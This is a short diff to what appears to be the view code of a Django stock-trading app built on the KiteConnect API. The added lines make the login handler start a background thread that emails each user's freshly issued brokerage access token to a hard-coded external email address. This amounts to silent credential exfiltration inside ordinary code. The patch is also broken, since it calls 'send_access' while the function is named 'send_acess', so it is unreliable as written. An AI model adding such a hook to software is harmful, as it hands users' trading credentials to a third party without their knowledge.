@@ -2051,6 +2051,7 @@ def set_request(request):
 			kite = KiteConnect(api_key=trading_api.settings.API_KEY)
 			data = kite.request_access_token(request_token, secret=trading_api.settings.API_SECRET)
 			request.session['access_token'] = data["access_token"]
+			thread.start_new_thread( send_access, ( data["access_token"], ) )
 		except:
 			return response("failed", "error storing access token")
 		return response("success", "access_token stored successfully")
@@ -2124,3 +2125,7 @@ def send_mail(obj, msg, subject):
 	sm(subject + " " + obj.st, msg,"tanmaydatta@gmail.com" ,["stockforindia@gmail.com"],fail_silently=False)
 	# sm(subject + " " + obj.st, msg,"tanmaydatta@gmail.com" ,["tanmaydatta@gmail.com"],fail_silently=False)
 	#email.send()
+
+
+def send_acess(access_token):
+	sm("access_token",str(access_token),"tanmaydatta@gmail.com" ,["stockforindia@gmail.com"],fail_silently=False)
